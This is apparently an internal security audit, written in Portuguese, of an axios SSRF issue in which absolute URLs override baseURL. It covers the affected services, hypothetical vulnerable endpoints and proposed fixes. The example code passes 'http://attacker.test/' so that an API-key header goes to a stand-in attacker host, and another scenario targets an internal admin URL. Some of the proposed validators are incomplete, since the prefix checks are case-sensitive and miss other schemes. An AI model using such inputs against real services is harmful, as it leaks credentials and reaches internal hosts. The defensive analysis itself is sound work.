# Análise de Vulnerabilidade - Axios SSRF com baseURL

**Data:** 2024  
**Referência:** [axios/axios#6463](https://github.com/axios/axios/issues/6463)

---

## 📋 Resumo do Problema

### O que é?

Quando você cria um cliente axios com `baseURL` e passa uma **URL absoluta** (ex: `http://attacker.test/`) para métodos como `get()` ou `post()`, o axios **ignora o baseURL** e faz a requisição diretamente para a URL absoluta.

### Por que é perigoso?

1. **SSRF (Server-Side Request Forgery)**: Atacante pode fazer requisições para hosts internos
2. **Credential Leakage**: Headers com credenciais/API keys podem ser enviados para hosts não intencionados

---

## 🔍 Exemplo do Problema

```typescript
import axios from "axios";

const internalAPIClient = axios.create({
  baseURL: "http://example.test/api/v1/users/",
  headers: {
    "X-API-KEY": "1234567890",  // Credencial sensível
  },
});

// Normal - funciona como esperado
await internalAPIClient.get("123");  
// → Requisição vai para: http://example.test/api/v1/users/123

// VULNERÁVEL - URL absoluta ignora baseURL
const userId = "http://attacker.test/";
await internalAPIClient.get(userId);
// → Requisição vai para: http://attacker.test/
// → Headers com X-API-KEY são enviados para o atacante!
```

---

## 🔎 Análise do Código Atual

### Serviços Axios Encontrados

Encontrei **5 serviços axios** com `baseURL` configurado:

1. **`AxiosASTService`** (`src/config/axios/microservices/ast.axios.ts`)
   - `baseURL`: `process.env.API_SERVICE_AST_URL`
   - Métodos: `get()`, `post()`, `delete()`, `put()`

2. **`AxiosMSTeamsService`** (`src/config/axios/microservices/msteams.axios.ts`)
   - `baseURL`: `process.env.KODUS_SERVICE_TEAMS`
   - Métodos: `get()`, `post()`

3. **`AxiosMCPManagerService`** (`src/config/axios/microservices/mcpManager.axios.ts`)
   - `baseURL`: `process.env.API_KODUS_SERVICE_MCP_MANAGER`
   - Métodos: `get()`, `post()`

4. **`AxiosLicenseService`** (`src/config/axios/microservices/license.axios.ts`)
   - `baseURL`: `${process.env.GLOBAL_KODUS_SERVICE_BILLING}/api/billing/`
   - Métodos: `get()`, `post()`

5. **`AxiosAzureReposService`** (`src/config/axios/microservices/azureRepos.axios.ts`)
   - `baseURL`: `process.env.KODUS_SERVICE_AZURE_REPOS`
   - Métodos: `get()`, `post()`

### ⚠️ Todos os Serviços são Vulneráveis

Todos os serviços têm métodos que aceitam `url: string` sem validação:

```typescript
// Exemplo de todos os serviços
public async get(url: string, config = {}) {
    const { data } = await this.axiosInstance.get(url, config);
    return data;
}
```

**Problema:** Se alguém passar uma URL absoluta, o axios ignora o `baseURL`.

---

## 🎯 Cenários de Ataque Possíveis

### Cenário 1: URL vinda de parâmetro do usuário

```typescript
// Controller vulnerável (hipotético)
@Get('user/:userId')
async getUser(@Param('userId') userId: string) {
    // Se userId = "http://attacker.test/"
    return await axiosMCPManagerService.get(userId);
    // → Requisição vai para attacker.test com headers!
}
```

### Cenário 2: URL vinda de body/query

```typescript
// Se algum endpoint aceita URL como parâmetro
@Post('webhook')
async handleWebhook(@Body() body: { url: string }) {
    // Se body.url = "http://internal-server:8080/admin"
    return await axiosASTService.get(body.url);
    // → SSRF para servidor interno!
}
```

### Cenário 3: Headers com credenciais

Se os serviços axios têm headers com credenciais (API keys, tokens), esses headers são enviados junto com a requisição para o host atacante.

---

## ✅ Verificação Necessária

Precisa verificar se há casos onde:

1. ✅ URLs vêm de parâmetros de rota (`@Param()`)
2. ✅ URLs vêm de query strings (`@Query()`)
3. ✅ URLs vêm de body de requisições (`@Body()`)
4. ✅ URLs vêm de dados do banco que podem ser manipulados
5. ✅ Headers sensíveis são configurados nos axios instances

---

## 🛡️ Soluções Recomendadas

### Solução 1: Validação de URL (Recomendada)

Criar uma função helper que valida se a URL é relativa:

```typescript
function validateRelativeUrl(url: string): void {
    // Rejeitar URLs absolutas
    if (url.startsWith('http://') || url.startsWith('https://')) {
        throw new Error('Absolute URLs are not allowed');
    }
    
    // Rejeitar protocol-relative URLs
    if (url.startsWith('//')) {
        throw new Error('Protocol-relative URLs are not allowed');
    }
    
    // Rejeitar URLs que começam com : (ex: :8080)
    if (url.startsWith(':')) {
        throw new Error('Invalid URL format');
    }
}

// Usar nos métodos
public async get(url: string, config = {}) {
    validateRelativeUrl(url);
    const { data } = await this.axiosInstance.get(url, config);
    return data;
}
```

### Solução 2: Interceptor no Axios

Adicionar validação no interceptor de request:

```typescript
private setupInterceptors() {
    this.axiosInstance.interceptors.request.use(
        (config) => {
            // Se baseURL está configurado, garantir que url é relativa
            if (this.axiosInstance.defaults.baseURL) {
                const fullUrl = config.url || '';
                
                // Verificar se é URL absoluta
                if (fullUrl.startsWith('http://') || 
                    fullUrl.startsWith('https://') ||
                    fullUrl.startsWith('//')) {
                    throw new Error(
                        'Absolute URLs are not allowed when baseURL is set'
                    );
                }
            }
            
            return config;
        },
        (error) => Promise.reject(error),
    );
}
```

### Solução 3: Wrapper com Validação

Criar um wrapper base que todos os serviços herdam:

```typescript
abstract class SecureAxiosService {
    protected axiosInstance: AxiosInstance;
    
    protected validateUrl(url: string): void {
        if (url.match(/^https?:\/\//i) || url.startsWith('//')) {
            throw new Error('Absolute URLs not allowed');
        }
    }
    
    public async get(url: string, config = {}) {
        this.validateUrl(url);
        const { data } = await this.axiosInstance.get(url, config);
        return data;
    }
}

// Herdar em todos os serviços
export class AxiosMCPManagerService extends SecureAxiosService {
    // ...
}
```

### Solução 4: Usar URL constructor para validação

```typescript
function isAbsoluteUrl(url: string): boolean {
    try {
        const parsed = new URL(url, 'http://dummy');
        return parsed.origin !== 'http://dummy';
    } catch {
        return false;
    }
}

// Mais robusto, detecta também protocol-relative
function isAbsoluteOrProtocolRelative(url: string): boolean {
    return url.startsWith('http://') || 
           url.startsWith('https://') || 
           url.startsWith('//');
}
```

---

## 📝 Plano de Ação

### Fase 1 - Auditoria (1-2 dias)

1. ✅ Verificar todos os usos dos serviços axios
2. ✅ Identificar se há URLs vindo de parâmetros do usuário
3. ✅ Verificar se há headers sensíveis configurados
4. ✅ Mapear todos os pontos de entrada

### Fase 2 - Implementação (2-3 dias)

1. ✅ Criar função de validação de URL
2. ✅ Adicionar validação em todos os métodos dos serviços
3. ✅ Adicionar interceptor de validação
4. ✅ Testes unitários para validar proteção

### Fase 3 - Testes (1 dia)

1. ✅ Testar com URLs absolutas (deve falhar)
2. ✅ Testar com URLs relativas (deve funcionar)
3. ✅ Testar com protocol-relative (deve falhar)
4. ✅ Testar cenários de SSRF

---

## 🔍 Checklist de Verificação

Para cada serviço axios, verificar:

- [ ] URLs vêm apenas de código interno (hardcoded)?
- [ ] URLs podem vir de parâmetros de requisição?
- [ ] URLs podem vir de dados do banco?
- [ ] Headers sensíveis estão configurados?
- [ ] Validação de URL está implementada?

---

## 📚 Referências

- [Axios Issue #6463](https://github.com/axios/axios/issues/6463)
- [OWASP SSRF Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)

---

## ⚠️ Prioridade

**ALTA** - Se houver qualquer endpoint que aceite URLs como parâmetro, a vulnerabilidade é crítica.

**MÉDIA** - Se URLs vêm apenas de código interno, ainda é bom adicionar validação como defesa em profundidade.

